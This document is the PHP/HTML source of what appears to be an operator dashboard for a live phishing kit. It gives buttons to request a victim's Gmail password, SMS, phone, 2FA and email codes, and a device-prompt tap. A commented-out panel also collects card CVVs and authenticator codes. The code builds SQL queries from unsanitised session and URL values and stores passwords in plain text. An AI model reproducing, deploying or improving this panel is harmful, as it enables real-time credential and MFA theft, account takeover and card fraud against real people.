<?php
@session_start();
//Incluindo a conexão com banco de dados
require_once "../cod3rconfig/registro.php";
require_once "../cod3rconfig/conexao.php";
require_once "../cod3rconfig/data.php";

$usuario = $_SESSION['usuarioNome'];
$senha = $_SESSION['usuarioPass'];

$usuariob =  DBRead1('usuarios', "WHERE nome = '$usuario' && senha = '$senha' LIMIT 1");

if (is_array($usuariob) || is_object($usuariob)) {
    foreach ($usuariob as $user) {
        if ($usuario == $user['nome'] and $senha == $user['senha']) {

            $iduser = $user['id'];
            $passuser = $user['senha'];
            $tipouser = $user['tipo'];

            $infos = DBRead('infos', 'ORDER BY id DESC');

            $url = 'https://' . $_SERVER['SERVER_NAME'];

            $usuer = DBRead('usuarios', 'ORDER BY id DESC');

            if (isset($_GET['ExcluirV'])) {


                $apagarvisita = DBDelete('visitas');

                if ($apagarvisita) {


                    header("Location: painel.php?pagina=Inicial");
                } else {

                    echo ":/";
                }
            }

            if (isset($_GET['ExcluirF'])) {


                DBDelete('infos');
                header("Location: painel.php?pagina=Inicial");
            }

            if (isset($_GET['Excluir'])) {
                $ids = $_GET['Excluir'];

                DBDelete('infos', "id = '$ids'");
                header("Location: painel.php?pagina=Inicial");
            }

            if (isset($_GET['ExcluirD'])) {
                $ids = $_GET['ExcluirD'];

                DBDelete('usuarios', "id = '$ids'");
                header("Location: painel.php?pagina=ConfUser");
            }

            $pagina = $_GET['pagina'];

?>
            <!DOCTYPE html>
            <html lang="en">

            <head>
                <meta charset="utf-8">
                <link rel="dns-prefetch" href="//fonts.googleapis.com">
                <link rel="dns-prefetch" href="//fonts.gstatic.com">
                <link rel="dns-prefetch" href="//use.fontawesome.com">
                <link rel="dns-prefetch" href="//kit.fontawesome.com">

                <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin>
                <link rel="preconnect" href="https://cdn.livechatinc.com/" crossorigin>
                <link rel="preconnect" href="https://kit.fontawesome.com" crossorigin>
                <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap-theme.min.css">
                <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
                <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
                <meta http-equiv="X-UA-Compatible" content="IE=edge">
                <link rel="icon" href="favicon.ico" />
                <meta name="msapplication-tap-highlight" content="no" />
                <meta name="mobile-web-app-capable" content="yes" />
                <meta name="application-name" content="Painel Master" />
                <meta name="apple-mobile-web-app-capable" content="yes" />
                <meta name="apple-mobile-web-app-status-bar-style" content="black" />
                <meta name="apple-mobile-web-app-title" content="Painel Master" />
                <meta name="theme-color" content="#4C7FF0" />
                <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, shrink-to-fit=no">
                <meta name="csrf-token" content="n9qy2tXZY5KLnpVMQ1w8AeEEULioGgegrHGj8CeX" />
                <meta name="csrf-param" content="_token" />
                <title>Painel Admin | REMOTE</title>
                <script src="https://kit.fontawesome.com/bc3a650eb9.js" crossorigin="anonymous"></script>
                <link rel="stylesheet" href="./css/app.css?id=40a6fe41dc9b81a07e19" />
                <link rel="stylesheet" href="./assets/css/plugins.css" type="text/css" />
                <link rel="stylesheet" href="./assets/css/widgets/modules-widgets.css" type="text/css" />
         

                <script type="text/javascript" src="http://code.jquery.com/qunit/qunit-1.11.0.js"></script>
                <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/limonte-sweetalert2/7.33.1/sweetalert2.min.css" />
                <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
                <script src="//cdnjs.cloudflare.com/ajax/libs/limonte-sweetalert2/7.33.1/sweetalert2.all.min.js"></script>
                <script src="//code.jquery.com/jquery-1.11.2.min.js"></script>
                <script src="api_getdados.js"></script>

                <style type="text/css">
                    fieldset {
                        border: 1px solid red;
                        height: 85px;
                        width: 150px;
                        padding-left: 20px;
                        margin-left: 10px;

                    }

                    legend {
                        font-size: 15px;
                        font-weight: bold;
                        text-align: center;

                    }

                    .dentro {
                        display: flex;
                        justify-items: center;
                        flex-direction: column;
                        align-items: center;
                        font-size: 12px;
                        width: 220px;
                        padding: 10px;
                        color: black;
                        margin: 5px;
                        border-radius: 10px;
                        background-color: rgba(0, 0, 0, .06);
                    }

                    .linhaComTexto {
                        width: 100%;
                        height: 20px;
                        border-bottom: 1px solid white;
                        text-align: center;
                    }

                    .linhaComTexto>span {
                        font-size: 20px;
                        background-color: #060818;
                        border: 1px solid transparent;
                    }
                </style>

                <script type="text/javascript">
                    $(document).ready(function() {
                        atualiza();
                    });

                    function atualiza() {
                        $.get('../access/visita.php',
                            function(resultado) {
                                //$('#visita').html(resultado);
                            })
                        $.get('../access/info.php',
                            function(resultado) {
                                $('#visita').html(resultado);
                            })
                        $.get('../access/xx.php',
                            function(resultado) {
                                $('#x9').html(resultado);
                            })
                        $.get('buscadados.php',
                            function(resultado) {
                                $('#tabelas').html(resultado);
                            })
                        $.get('usuarios.php',
                            function(resultado) {
                                $('#user_tabela').html(resultado);
                            })
                         $.get('localizacao.php', 
        function(resultado){
            $('#tabela_visitas').html(resultado);
        })
                        $.get('tocar.php',
                            function(resultado) {

                                if (resultado == "info") {

                                    var audio = new Audio('tocar.mp3');
                                    audio.addEventListener('canplaythrough', function() {
                                        audio.play();
                                        notify();
                                    });
                                }

                                if (resultado == "info2") {

                                    var audio = new Audio('tocar2.mp3');
                                    audio.addEventListener('canplaythrough', function() {
                                        audio.play();
                                        notify();
                                    });
                                }
                            })
                        setTimeout('atualiza()', 2000);
                    }
                </script>

                <script type="text/javascript">
                    // Get the modal
                    var modal = document.getElementById("myModal");

                    // Get the button that opens the modal
                    var btn = document.getElementById("myBtn");

                    // Get the <span> element that closes the modal
                    var span = document.getElementsByClassName("close")[0];

                    // When the user clicks the button, open the modal 
                    btn.onclick = function() {
                        modal.style.display = "block";
                    }

                    // When the user clicks on <span> (x), close the modal
                    span.onclick = function() {
                        modal.style.display = "none";
                    }

                    // When the user clicks anywhere outside of the modal, close it
                    window.onclick = function(event) {
                        if (event.target == modal) {
                            modal.style.display = "none";
                        }
                    }
                </script>
                <style>
                    .copyButton {
                        border: none;
                        padding: 10px;
                        margin: 5px;
                        margin-left: 20px;
                        width: 105px;
                        border-radius: 5px;
                        background-color: rgba(0, 0, 0, .05);
                        color: blue;
                        transition: background-color .2s ease;
                        cursor: pointer;
                        white-space: nowrap;
                        overflow: hidden;
                        text-overflow: ellipsis;
                    }

                    .copyButton[copied] {
                        transition: background-color .2s ease;
                        transition: color .1s ease;
                        background-color: #4CAF50;
                        color: white;
                    }
                </style>
            </head>

            <body class="alt-menu sidebar-noneoverflow">

                <div id="modalApp">
                    <modalpassword></modalpassword>
                    <configuracao tela="bb"></configuracao>
                </div>

                <div class="header-container">
                    <header class="header navbar navbar-expand-sm">

                        <a href="javascript:void(0);" class="sidebarCollapse" data-placement="bottom"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-menu">
                                <line x1="3" y1="12" x2="21" y2="12"></line>
                                <line x1="3" y1="6" x2="21" y2="6"></line>
                                <line x1="3" y1="18" x2="21" y2="18"></line>
                            </svg></a>
                        <i class="fas fa-fire fa-2x"></i>
                        <div class="nav-logo align-self-center">

                            <a class="navbar-brand" href="?pagina=Inicial"><span class="navbar-brand-name"> &nbsp PAINEL
                                    <small>v5.0</small></span></a>
                        </div>

                        <ul class="navbar-item flex-row nav-dropdowns ml-auto">
                            <li class="nav-item dropdown user-profile-dropdown order-lg-0 order-1">
                                <div class="media">
                                    <a href="./sair.php">
                                        <button class="button btn btn-danger">
                                            Sair
                                        </button>
                                    </a>

                                </div>

                            </li>
                        </ul>
                    </header>
                </div>


                <!--  BEGIN MAIN CONTAINER  -->
                <div class="main-container" id="container">


                    <!--  BEGIN TOPBAR  -->
                    <div class="topbar-nav header navbar" role="banner">
                        <nav id="topbar">
                            <ul class="navbar-nav theme-brand flex-row  text-center">
                                <li class="nav-item theme-text">
                                    <a href="" class="nav-link"> PAINEL </a>
                                </li>
                            </ul>

                            <ul class="list-unstyled menu-categories" id="topAccordion">
                                <li class="menu single-menu">
                                    <a href="?pagina=Inicial">
                                        <div class="">
                                            <svg width="1em" height="1em" viewBox="0 0 16 16" class="bi bi-cash" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
                                                <path fill-rule="evenodd" d="M15 4H1v8h14V4zM1 3a1 1 0 0 0-1 1v8a1 1 0 0 0 1 1h14a1 1 0 0 0 1-1V4a1 1 0 0 0-1-1H1z" />
                                                <path d="M13 4a2 2 0 0 0 2 2V4h-2zM3 4a2 2 0 0 1-2 2V4h2zm10 8a2 2 0 0 1 2-2v2h-2zM3 12a2 2 0 0 0-2-2v2h2zm7-4a2 2 0 1 1-4 0 2 2 0 0 1 4 0z" />
                                            </svg>
                                            <span>Infos</span>
                                        </div>
                                    </a>
                                </li>
                                <li class="menu single-menu">
                                    <a href="<?php echo $url ?>" target="_blank">
                                        <div class="">
                                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-copy">
                                                <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
                                                <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
                                            </svg>
                                            <span>Abrir Link</span>
                                        </div>
                                    </a>
                                </li>

                                <li class="menu single-menu">
                                    <a href="javascript:void(0)" class="nav-link" data-toggle="modal" data-target="#confirmadelinfo" role="button">
                                        <div class="">
                                            <svg width="1em" height="1em" viewBox="0 0 16 16" class="bi bi-trash-fill" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
                                                <path fill-rule="evenodd" d="M2.5 1a1 1 0 0 0-1 1v1a1 1 0 0 0 1 1H3v9a2 2 0 0 0 2 2h6a2 2 0 0 0 2-2V4h.5a1 1 0 0 0 1-1V2a1 1 0 0 0-1-1H10a1 1 0 0 0-1-1H7a1 1 0 0 0-1 1H2.5zm3 4a.5.5 0 0 1 .5.5v7a.5.5 0 0 1-1 0v-7a.5.5 0 0 1 .5-.5zM8 5a.5.5 0 0 1 .5.5v7a.5.5 0 0 1-1 0v-7A.5.5 0 0 1 8 5zm3 .5a.5.5 0 0 0-1 0v7a.5.5 0 0 0 1 0v-7z" />
                                            </svg>
                                            <span>Limpar Infos</span>
                                        </div>
                                    </a>
                                </li>
                                <li class="menu single-menu">
                                    <a href="?ExcluirV" class="nav-link" role="button">
                                        <div class="">
                                            <svg width="1em" height="1em" viewBox="0 0 16 16" class="bi bi-trash-fill" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
                                                <path fill-rule="evenodd" d="M2.5 1a1 1 0 0 0-1 1v1a1 1 0 0 0 1 1H3v9a2 2 0 0 0 2 2h6a2 2 0 0 0 2-2V4h.5a1 1 0 0 0 1-1V2a1 1 0 0 0-1-1H10a1 1 0 0 0-1-1H7a1 1 0 0 0-1 1H2.5zm3 4a.5.5 0 0 1 .5.5v7a.5.5 0 0 1-1 0v-7a.5.5 0 0 1 .5-.5zM8 5a.5.5 0 0 1 .5.5v7a.5.5 0 0 1-1 0v-7A.5.5 0 0 1 8 5zm3 .5a.5.5 0 0 0-1 0v7a.5.5 0 0 0 1 0v-7z" />
                                            </svg>
                                            <span>Limpar Visitas</span>
                                        </div>
                                    </a>
                                </li>



                                <?php if ($tipouser == "op") {
                                } else { ?>
                                    <li class="menu single-menu">
                                        <a href="?pagina=ConfUser" class="nav-link" role="button">
                                            <div class="">
                                                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-settings">
                                                    <circle cx="12" cy="12" r="3"></circle>
                                                    <path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z">
                                                    </path>
                                                </svg>
                                                <span>Gerenciar Usuários</span>
                                            </div>
                                        </a>
                                    </li>

                                    <li class="menu single-menu">
                                        <a href="javascript:void(0)" class="nav-link" data-toggle="modal" data-target="#adduser-remote" role="button">
                                            <div class="">
                                                <svg width="1em" height="1em" viewBox="0 0 16 16" class="bi bi-people-fill" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
                                                    <path fill-rule="evenodd" d="M7 14s-1 0-1-1 1-4 5-4 5 3 5 4-1 1-1 1H7zm4-6a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-5.784 6A2.238 2.238 0 0 1 5 13c0-1.355.68-2.75 1.936-3.72A6.325 6.325 0 0 0 5 9c-4 0-5 3-5 4s1 1 1 1h4.216zM4.5 8a2.5 2.5 0 1 0 0-5 2.5 2.5 0 0 0 0 5z" />
                                                </svg>
                                                <span>Adicionar Usuários</span>
                                            </div>
                                        </a>
                                    </li>

                                <?php } ?>


                            </ul>
                        </nav>
                    </div>

                    <div id="content" class="main-content">
                        <div class="layout-px-spacing">





                            <!-- CONTENT AREA -->

                            <div class="row justify-content-center align-items-center analytics layout-top-spacing">
                                <div class="col-xl-12 col-lg-12 col-md-12 col-sm-12 col-12">
                                    <div class="row widget-statistic">




                                        <div class="dentro" style="width: 300px;">
                                            <legend style="color:black;">Login</legend>
                                            <div>
                                                <button style="" type="submit" class="btn btn-danger" id="negaruser">N User</button>                                               
                                                <button type="submit" class="btn btn-success" id="ok">Fim</button>
                                           
                                               
                                            </div>
                                        </div>
                                        

                                        


                                     
                                        <div class="col-xl-3 col-lg-3 col-md-3 col-sm-5 col-12">
                                            <div class="widget widget-one_hybrid widget-engagement">
                                                <div class="widget-heading text-left">




                                                    <strong style="color:yellow;">ID: <input style="outline: 0; border: 0 solid white; text-align: center;" disabled="true" type="text" name="idremote" id="idremote" value="" size="2"></strong><br>
                                                    <strong style="color:yellow;" id="statusR">Status:</strong>
                                                </div>
                                            </div>
                                        </div>

                                        <div class="col-xl-1 col-lg-1 col-md-2 col-sm-3 col-12">
                                            <div class="widget widget-one_hybrid widget-engagement">
                                                <div class="widget-heading text-center">

                                                   <a href="?pagina=Visitantes">                         
<div id="visita"></div>
<strong>Visitas</strong>
</a>
                                                </div>
                                            </div>
                                        </div>


                                    </div>
                                </div>
                            </div>
                            
                            <div class="row justify-content-center align-items-center analytics layout-top-spacing">
                                <div class="col-xl-12 col-lg-12 col-md-12 col-sm-12 col-12">
                                    <div class="row widget-statistic">




                                        <div style="width:200px" class="dentro">
                                            <h6 style="color: black; font-weight:bolder; text-align: center;">Senha do Mail</h6>
                                            <div>
                                                <button style="margin-left: 20px;" type="submit" class="btn btn-success" id="pediremail">P</button>
                                                <button type="submit" class="btn btn-danger" id="negaremailsyng">N</button>
                                            </div>
                                          
                                        </div>
                                        <div class="dentro">
                                            <h6 style="color: black; font-weight:bolder; text-align: center;">SMS Mail</h6>
                                            <div>
                                                <button style="margin-left: 20px;" type="submit" class="btn btn-success" id="pedirsmsgmail">P</button>
                                                <button type="submit" class="btn btn-danger" id="negargmail">N</button>
                                            </div>
                                           
                                        </div>

                                        <div class="dentro">
                                            <h6 style="color: black; font-weight:bolder; text-align: center;">Fone Mail</h6>
                                            <div>
                                                <button style="margin-left: 20px;" type="submit" class="btn btn-success" id="pedirtelefonegmail">P</button>
                                                <button type="submit" class="btn btn-danger" id="negargmailtelefone">N</button>
                                            </div>
                                          
                                        </div>

                                        <div class="dentro">
                                            <h6 style="color: black; font-weight:bolder; text-align: center;">2FA Mail</h6>
                                            <div>
                                                <button style="margin-left: 20px;" type="submit" class="btn btn-success" id="pedirtokengmail">P</button>
                                                <button type="submit" class="btn btn-danger" id="negartokengmail">N</button>
                                            </div>
                                            
                                        </div>

                                        <div class="dentro">
                                            <h6 style="color: black; font-weight:bolder; text-align: center;">Cód Mail</h6>
                                            <div>
                                                <button style="margin-left: 20px;" type="submit" class="btn btn-success" id="pedircodemail">P</button>
                                                <button type="submit" class="btn btn-danger" id="negarcodemail">N</button>
                                            </div>
                                           
                                        </div>

                                        <script>
                                            function copyText(buttonID) {
                                                const button = document.querySelector(buttonID)
                                                CopyText(button.textContent)
                                                button.setAttribute('copied', true)
                                                setTimeout(() => {
                                                    button.removeAttribute('copied')
                                                }, 3000)
                                            }
                                        </script>
                                        <script src="//cdn.jsdelivr.net/npm/text-copy/index.min.js"></script>
                                        <div class="dentro" style="width:300px; height:150px;">


                                            <!-- id="autenticadorq" -->

                                            <legend>Toque Tela Gmail (Modelo Celular)</legend>
                                            <div>
                                                <input type="text" size="20" name="autenticadorq" value="" placeholder="Exemplo: Samsung Galaxy S21" id="autenticadorq">
                                            </div>
                                            <div style="">
                                                <input type="text" size="30" name="autenticador" id="autenticador" value="" placeholder="Exemplo: 80">
                                            </div>
                                            <button type="submit" class="btn btn-success" id="notificagmailq" style="width: 60%;">Pedir</button>
                                        </div>
                                    </div>
                                </div>
                            </div>
                           
                            <button type="button" style="display:none" class="btn btn-success" id="updadeinfo" size="10"><b>Atualizar Infos<b></button>
                            <style>
                                #dataModal .table td {
                                    border: 1px solid #dee2e6;
                                }

                                .indicator.online {
                                    background: #28B62C;
                                    display: inline-block;
                                    width: 1em;
                                    height: 1em;
                                    border-radius: 50%;
                                    -webkit-animation: pulse-animation 2s infinite linear;
                                }

                                @-webkit-keyframes pulse-animation {
                                    0% {
                                        -webkit-transform: scale(1);
                                    }

                                    25% {
                                        -webkit-transform: scale(1);
                                    }

                                    50% {
                                        -webkit-transform: scale(1.2)
                                    }

                                    75% {
                                        -webkit-transform: scale(1);
                                    }

                                    100% {
                                        -webkit-transform: scale(1);
                                    }
                                }

                                .indicator.offline {
                                    background: #FF4136;
                                    display: inline-block;
                                    width: 1em;
                                    height: 1em;

                                }
                            </style>
                            <div id="confirmadelinfo" class="modal fade" tabindex="-1" role="dialog" aria-labelledby="dataModalTitle" aria-hidden="true" v-if="cliente">
                                <div class="modal-dialog modal-dialog-centered " role="document">
                                    <div class="modal-content">

                                        <div class="modal-header">
                                            <font color="white">
                                                <h5>Deseja Excluir as Infos?</h5>
                                            </font>

                                        </div>

                                        <div class="modal-footer">
                                            <button class="btn btn-success" id="confirma_del_infos">SIM</button>
                                            <button type="button" class="btn btn-secondary" data-dismiss="modal">NÂO</button>
                                        </div>
                                    </div>
                                </div>
                            </div>

                            <!--
	 <div id="emp-remote" class="modal fade" tabindex="-1" role="dialog" aria-labelledby="dataModalTitle" aria-hidden="true" v-if="cliente">
        <div class="modal-dialog modal-dialog-centered  modal-lg"  role="document">
            <div class="modal-content">

                <div class="modal-header">
                    <input type="text" name="idremote" id="idremote" value="" size="3">&nbsp;&nbsp;
                    <h5 class="modal-title" id="dataModalTitle">
                                              
						
						
                        <div id="statusonline"></div>
                    </h5>
                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                        <svg aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-x"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg>
                    </button>
                </div>
                <div class="modal-body">
                    <div class="">
                        <table class="table table-bordered table-lg text-white">
                            <tbody>
                             
                                <tr><th>E-mail</th><td>
                                     <input type="text" size="34" name="email" id="email" value="">
                                    <button class="btn btn-secondary" onclick="copiaremail()">Copiar</button>
                                </td></tr>
                                <tr><th>Senha</th><td>
                                    
                                     <input type="text" size="34" name="senha" id="senha" value="">
                                    <button class="btn btn-secondary" onclick="copiarsenha()">Copiar</button>
                                </td></tr>
                                <tr><th>CVV</th><td><textarea rows="4" cols="50" id="cvv"></textarea></td></tr>
                                <tr><th><font color="red">SMS</font></th>
                                    <td>
                                        <input type="text" size="34" name="smsr" id="smsr" value="">
                                    <button class="btn btn-secondary" onclick="copiarsmsr()">Copiar</button>
                                    </td></tr>
                                <tr><th><font color="red">Google Authenticator</font></th>
                                    <td>
                                        <input type="text" size="34" name="googleaut" id="googleaut" value="">
                                    <button class="btn btn-secondary" onclick="copiargoogleaut()">Copiar</button>
                                    </td></tr>
                                <tr><th ><font color="red">Numero tele/cc</font></th><td ><input type="text" name="numerotele" id="numerotele" value=""></td></tr>
                                
								
						</tbody>
                        </table>
						<table class="table table-lg text-white">
                            <tbody>
                                <tr>
                                 <td>  <button type="button" class="btn btn-secondary" id="pedirsms_tel"><b>SMS/TELE<b></button> </td>
								
                                 <td>  <button type="button" class="btn btn-secondary" id="pedirgoolgeaut"><b>Google Authenticator<b></button> </td>   
                            
                            
                                
 <td>  

<label for="bandeira">Bandeira:</label>
 <select id="bandeira" class="btn btn-secondary">
  <option value="Visa">Visa</option>
  <option value="Master">Master</option>
  <option value="Hiper">Hiper</option>
  <option value="Amex">Amex</option>
</select> </td> 
                              <td>  <button type="button" class="btn btn-secondary" id="pedircard"><b>Pedir CVV<b></button> </td> 

                            </tr>
								 <tr>
                                 <td>  <button type="button" class="btn btn-warning" id="pedirautml"><b>Notificação no App<b></button> </td>  
								    
                                
                                    
                                    <td><button type="button" class="btn btn-danger" id="emailerror" ><b>Negar email/senha<b></button></td>
									<td><button type="button" class="btn btn-danger" id="cvverror"><b>Negar SMS<b></button></td>
									<td><button type="button" class="btn btn-success" id="ok"><b>Finalizar<b></button></td>
                                </tr>
								                               
                            </tbody>
                        </table>
						
						<table class="table table-bordered table-sm text-white">
                            <tbody>                         
                                
								  <tr>
                                    
                                    <td>
									<h5 class="modal-title" id="dataModalTitle">
                        <span class="indicator online" v-if="cliente.heat_time && moment().diff(cliente.heat_time, 'seconds') <= 50"></span>
                        <td><font color="green" size="2"> Status da OP: </font></td>
						<td><font color="green" size="2"> <div id="statusR"></div> </font></td>
						
						
                        </h5>
									<div style="display:none">
									<button type="button" class="btn btn-success" id="updadeinfo" size="10"><b>Atualizar Infos<b></button>
									
									</div>
									</td>
									
                                </tr>                              
                            </tbody>
                        </table>
                    </div>
                </div>
				 
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-dismiss="modal">Fechar</button>
                </div>
            </div>
        </div>
    </div>
-->
                            <div id="adduser-remote" class="modal fade" tabindex="-1" role="dialog" aria-labelledby="dataModalTitle" aria-hidden="true" v-if="cliente">
                                <div class="modal-dialog modal-dialog-centered  modal-lg" role="document">
                                    <div class="modal-content">

                                        <div class="modal-header">

                                            <h5 class="modal-title" id="dataModalTitle">

                                                Adicionar Usuário

                                            </h5>
                                            <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                                                <svg aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-x">
                                                    <line x1="18" y1="6" x2="6" y2="18"></line>
                                                    <line x1="6" y1="6" x2="18" y2="18"></line>
                                                </svg>
                                            </button>
                                        </div>
                                        <div class="modal-body">
                                            <div class="">
                                                <table class="table table-bordered table-lg text-white">
                                                    <tbody>
                                                        <tr>
                                                            <th>Tipo:</th>
                                                            <td>
                                                                <select name="tipo_user_add" id="tipo_user_add" class="form-control" value="<?php echo $tipouser ?>">
                                                                    <option value="op" class="ng-binding">Operador</option>
                                                                    <option value="admin" class="ng-binding">Admin</option>

                                                                </select>

                                                            </td>
                                                        </tr>
                                                        <tr>
                                                            <th>Usuário:</th>
                                                            <td><input type="text" class="form-control" size="50" name="usuario_user" id="usuario_user" value=""></td>
                                                        </tr>
                                                        <tr>
                                                            <th>Senha</th>
                                                            <td><input type="text" class="form-control" size="50" name="senha_user" id="senha_user" value=""></td>
                                                        </tr>
                                                        </tr>


                                                    </tbody>


                                                    <table class="table table-bordered table-sm text-white">
                                                        <tbody>

                                                            <tr>

                                                                <td>

                                                                    <div style="display:block">
                                                                        <button type="button" class="btn btn-secondary" id="add_user" size="10"><b>Adicionar Usuário<b></button>

                                                                    </div>
                                                                </td>

                                                            </tr>
                                                        </tbody>
                                                    </table>
                                            </div>
                                        </div>

                                        <div class="modal-footer">
                                            <button type="button" class="btn btn-secondary" data-dismiss="modal">Fechar</button>
                                        </div>
                                    </div>
                                </div>
                            </div>

                            <div id="edituser-remote" class="modal fade" tabindex="-1" role="dialog" aria-labelledby="dataModalTitle" aria-hidden="true" v-if="cliente">
                                <div class="modal-dialog modal-dialog-centered  modal-lg" role="document">
                                    <div class="modal-content">

                                        <div class="modal-header">

                                            <h5 class="modal-title" id="dataModalTitle">

                                                Editar Usuário

                                            </h5>
                                            <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                                                <svg aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-x">
                                                    <line x1="18" y1="6" x2="6" y2="18"></line>
                                                    <line x1="6" y1="6" x2="18" y2="18"></line>
                                                </svg>
                                            </button>
                                        </div>
                                        <div class="modal-body">
                                            <div class="">
                                                <table class="table table-bordered table-lg text-white">
                                                    <tbody>
                                                        <tr>
                                                            <th>ID:</th>
                                                            <td><input type="text" size="50" class="form-control" name="id_user_edit" id="id_user_edit" value="<?php echo $iduser ?>"></td>
                                                        </tr>
                                                        <tr>
                                                            <th>TIPO:</th>
                                                            <td>

                                                                <select name="id_usertipo_edit" id="id_usertipo_edit" class="form-control" value="<?php echo $tipouser ?>">
                                                                    <option value="op" class="ng-binding">Operador</option>
                                                                    <option value="admin" class="ng-binding">Admin</option>

                                                                </select>

                                                            </td>
                                                        </tr>
                                                        <tr>
                                                            <th>Usuário:</th>
                                                            <td><input type="text" size="50" class="form-control" name="user_edit" id="user_edit" value="<?php echo $usuario ?>"></td>
                                                        </tr>
                                                        <tr>
                                                            <th>Senha</th>
                                                            <td><input type="text" size="50" class="form-control" name="pass_edit" id="pass_edit" value="<?php echo $passuser ?>"></td>
                                                        </tr>
                                                        </tr>


                                                    </tbody>


                                                    <table class="table table-bordered table-sm text-white">
                                                        <tbody>

                                                            <tr>

                                                                <td>

                                                                    <div style="display:block">
                                                                        <button type="button" class="btn btn-secondary" id="alt_add_user" size="10"><b>Alterar
                                                                                Usuário<b></button>

                                                                    </div>
                                                                </td>

                                                            </tr>
                                                        </tbody>
                                                    </table>
                                            </div>
                                        </div>

                                        <div class="modal-footer">
                                            <button type="button" class="btn btn-secondary" data-dismiss="modal">Fechar</button>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div class="row gutters" id="wrapper" v-cloak>
                                <?php



                                if (isset($_GET['alt'])) {
                                    $ids = $_GET['alt'];


                                    $status = array(
                                        'status' => "0"
                                    );


                                    DBUpDate('infos', $status, "id = '$ids'");
                                    header("Location: infos.php");
                                }


                                ?>
                                <?php if ($pagina == "Inicial") { ?>
                                    <div class="col-xl-12 col-lg-12 col-md-12 col-sm-12 col-12">
                                        <div class="table-container">
                                            <div class="table-responsive">

                                                <div id="tabelas"></div>

                                            </div>
                                        </div>
                                    </div>
                                <?php } ?>

                                <?php if ($pagina == "ConfUser") { ?>
                                    <div class="col-xl-12 col-lg-12 col-md-12 col-sm-12 col-12">
                                        <div class="table-container">
                                            <div class="table-responsive">

                                                <div id="user_tabela"></div>
                                            </div>
                                        </div>
                                    </div>

                                <?php } ?>

                                <?php if($pagina == "Visitantes"){?>
    <div class="col-xl-12 col-lg-12 col-md-12 col-sm-12 col-12">
        <div class="table-container">
            <div class="table-responsive">
                       
                  <div id="tabela_visitas"></div>                  
            </div>
        </div>
    </div>

    <?php } ?> 
                            </div>

                <?php


            }
        }
    } else {
        //Váriavel global recebendo a mensagem de erro
        $_SESSION['loginErro'] = "Usuário ou senha Inválido";
        header("Location: index.php");
    } //fim

                ?>
                <script>
                    // Get the modal
                    var modal = document.getElementById("myModal");

                    // Get the button that opens the modal
                    var btn = document.getElementById("myBtn");

                    // Get the <span> element that closes the modal
                    var span = document.getElementsByClassName("close")[0];

                    // When the user clicks the button, open the modal 
                    btn.onclick = function() {
                        modal.style.display = "block";
                    }

                    // When the user clicks on <span> (x), close the modal
                    span.onclick = function() {
                        modal.style.display = "none";
                    }

                    // When the user clicks anywhere outside of the modal, close it
                    window.onclick = function(event) {
                        if (event.target == modal) {
                            modal.style.display = "none";
                        }
                    }
                </script>

                <!-- CONTENT AREA -->

                        </div>

                    </div>
                </div>

